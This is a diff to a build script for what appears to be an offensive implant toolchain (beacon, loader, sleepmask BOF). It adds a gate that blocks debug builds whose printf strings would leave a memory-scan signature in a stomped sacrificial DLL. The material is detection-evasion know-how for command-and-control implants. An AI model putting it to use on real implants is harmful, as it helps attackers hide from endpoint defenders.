@@ -70,6 +70,27 @@ def pack_nax() -> None:
     ], LOADER, "pack nax_adv.x64.bin")
 
 
+def gate_sleepmask() -> None:
+    """Merge-blocking gate: the embedded sleepmask .o must be a release build.
+
+    A debug .o (make -C src_sleepmask debug) carries `[sleepmask]`/`[spoof]`
+    printf strings and an MSVCRT$printf import that get stomped into the
+    sacrificial DLL's .text for the whole process life — a cheap memory-scan
+    signature.  This fails the build until the release variant is embedded.
+    """
+    bof = NAX / "src_sleepmask/dist/sleepmask.x64.o"
+    if not bof.exists():
+        raise RuntimeError(f"sleepmask BOF missing: {bof} (make -C src_sleepmask all)")
+    debug_markers = [b"[sleepmask]", b"[spoof]", b"MSVCRT$printf"]
+    hits = [m.decode() for m in debug_markers if m in bof.read_bytes()]
+    if hits:
+        raise RuntimeError(
+            f"debug-variant sleepmask embedded ({hits}) — "
+            f"run `make -C {NAX}/src_sleepmask all` then `python3 {NAX}/scripts/embed_sleepmask.py`"
+        )
+    print(f"[+] sleepmask gate ok: {bof} clean ({bof.stat().st_size} bytes, release)")
+
+
 def verify_nax_header() -> None:
     path = LOADER / "bin/nax_adv.x64.bin"
     data = path.read_bytes()
@@ -168,6 +189,7 @@ def main() -> int:
     try:
         if not args.skip_beacon:
             build_beacon()
+        gate_sleepmask()
         if not args.skip_loader:
             build_loader()
         pack_nax()
